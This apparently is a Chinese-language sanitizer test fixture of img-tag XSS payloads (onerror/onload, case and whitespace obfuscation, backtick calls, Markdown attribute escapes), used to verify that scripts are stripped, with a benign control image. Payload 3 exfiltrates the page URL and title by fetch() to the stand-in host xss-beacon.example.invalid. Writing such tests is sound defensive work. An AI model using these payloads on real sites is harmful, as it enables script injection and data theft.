# XSS 样本 02：img 标签 onerror 事件

**攻击手法**：`<img>` 指向一个必然加载失败的地址，浏览器触发 `onerror`，从而执行属性中的脚本。这是最经典、成功率最高的无 `<script>` XSS 形态——因为很多过滤器只盯着 `<script>`，忘了事件属性。

**预期：脚本不执行、无外网请求。**

**验证方法**：打开本文件 → 无弹窗 → Console 无 `XSS-02` 输出 → Network 中无 `xss-beacon.example.invalid` 请求 → Elements 面板中 `onerror` 属性已被剥离。

---

## payload 1：最基础形态

<img src=x onerror="alert('XSS-02-A')">

## payload 2：带引号变体与失效协议

<img src="不存在的图片.png" onerror='alert("XSS-02-B")'>

<img src=// onerror=alert('XSS-02-C')>

## payload 3：数据外带（beacon）

<img src=x onerror="fetch('https://xss-beacon.example.invalid/02-d?href=' + encodeURIComponent(location.href) + '&title=' + encodeURIComponent(document.title))">

## payload 4：大小写与空白混淆

<IMG SRC=x OnErRoR=alert('XSS-02-E')>

<img
   src = x
   onerror
   =
   alert('XSS-02-F')
>

## payload 5：无引号 + 反引号（针对基于引号切分的过滤器）

<img src=x onerror=alert`XSS-02-G`>

## payload 6：onload 变体（指向真实可加载资源时触发）

<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onload="alert('XSS-02-H')">

## payload 7：Markdown 图片语法内的属性逃逸

尝试用 title 参数闭合引号并注入属性：

![逃逸尝试](x" onerror="alert('XSS-02-I') "标题")

![逃逸尝试 2](x onerror=alert('XSS-02-J'))

## payload 8：srcset 与 picture

<picture>
  <source srcset="x" onerror="alert('XSS-02-K')">
  <img src=x onerror="alert('XSS-02-L')">
</picture>

## payload 9：懒加载属性组合

<img src=x loading="lazy" decoding="async" onerror="alert('XSS-02-M')" onload="alert('XSS-02-N')">

---

## 对照组（应保留的良性图片）

<img src="../assets/architecture.png" alt="良性本地图片，src 与 alt 应保留" width="320">

> **判定口径**：所有 payload 均不执行、不产生外网请求；对照组的 `<img>` 标签本身保留（图片文件缺失导致的占位是正常现象）。
